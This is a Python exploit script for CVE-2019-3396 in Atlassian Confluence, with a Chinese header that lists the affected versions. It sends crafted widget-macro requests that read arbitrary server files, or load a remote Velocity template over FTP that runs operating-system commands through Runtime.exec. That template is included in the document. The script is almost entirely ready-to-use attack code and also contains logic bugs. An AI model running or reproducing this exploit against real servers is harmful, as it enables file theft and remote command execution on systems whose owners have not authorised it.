'''
CVE-2019-3396  Atlassian Confluence 路径穿越与命令执行漏洞
writen by ophxc
影响版本：
6.6.12版本之前所有版本
6.7.0-6.12.2版本
6.13.3之前的所有6.13.x版本
6.14.2之前的所有6.14.x版本
'''
import re
import requests
import argparse

parser=argparse.ArgumentParser(description="usage of CVE-9-3396")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-c","--command",help="the command you want to excute")
parser.add_argument("-f","--filename",help="the file you want to read")
args=parser.parse_args()

url=args.url
cmd = args.command
file=args.filename

url2 = url + "/rest/tinymce/1/macro/preview"

flag=input("do you want to read a file or write a shell?(r/w)")

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Referer": url + "/pages/resumedraft.action?draftId=1&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
    "Content-Type": "application/json; charset=utf-8"
}

if(flag=="r"):
    file="file://"+file
    poc='{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % (file)
    res2=requests.post(url=url2,headers=headers,data=poc)
    filename=file[:-4]+".html"
    read=open(filename,"w")
    read.write(res2.text)
    exit("the file is download in "+filename)

'''
#set ($exp="exp")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
'''

if(flag=="w"):
    ftp =input("give mu the shell place like:ftp://*/rm")
    if cmd is None:
        input("please input the command:")
data = '{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s","command":"%s"}}}' % (ftp, cmd)
res = requests.post(url2, data=data, headers=headers)
if res.status_code == 200 and "wiki-content" in res.text:
    m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', res.text, re.S)
    print ('>>>>the result is:\n',m[0].strip())